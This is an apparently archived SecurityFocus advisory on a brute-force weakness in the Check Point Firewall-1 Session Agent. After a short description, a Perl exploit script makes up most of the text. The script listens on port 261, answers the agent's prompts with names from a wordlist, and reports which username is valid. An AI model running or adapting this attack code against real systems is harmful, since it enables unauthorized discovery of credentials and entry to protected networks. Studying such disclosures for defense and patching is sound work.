source: http://www.securityfocus.com/bid/1662/info

A vulnerability exists in all versions of the Check Point Session Agent, part of Firewall-1. Session Agent works in such a way that the firewall will establish a connection back to the client machine. Upon doing so, it will prompt for a username, and if the username exists, a password. Upon failure, it will reprompt indefinitely. This allows for a simple brute force attack against the username and password.

#!/usr/bin/perl -w
#
# File  :       brute-fw1-agent.pl
# Author:       Nelson Brito<nelson@secunet.com.br || nelson@sekure.org>
#
# Untested code, use on your own risc.
#
use Socket;

$c = 0; $port = 261; #$proto = getprotobyname('tcp');

socket(FAGENT, PF_INET, SOCK_STREAM, getprotobyname("tcp"))     or die
"socket:$!";
setsockopt(FAGENT, SOL_SOCKET, SO_REUSEADDR, pack("l", 1))      or die
"setsockopt: $!";
bind(FAGENT, sockaddr_in($port, INADDR_ANY))                    or die
"bind: $!";
listen(FAGENT, SOMAXCONN)                                       or die
"listen: $!";

open(SDI, "users") or die "open: $!\n";
until(eof(SDI)){
        $user = <SDI>; chomp($user);
        next if ($user=~/^\s*#/);
        next if ($user=~/^\s*$/);
        push @users, $user;
}
close(SDI);

while(accept(MODULE, FAGENT)){
LINE:   $c++;
        print STDOUT "[+] Hii... I'm on TV $c times!\n";
        recv(MODULE, $target, 1024, 0);
        if($target=~/^331/i){
                chomp($users[0]);
                send(MODULE, "$users[0]\n", 0);
                recv(MODULE, $target, 1024, 0);
                if($target=~/^220/){
                        recv(MODULE, $target, 1024, 0);
                        if($target=~/^530/){
                                shift @users; goto LINE;
                        }else{
                                die "[-] Unknow code. What happened?\n";
                        }
                }elsif($target=~/^331/){
                        print STDOUT "[+] The $users[0] username is right!\n";
                }else{
                        die "[-] Uknow return code. What happened?\n";
                }
        }else{
                die "[-] Unknow return code. What happened?\n";
        }

}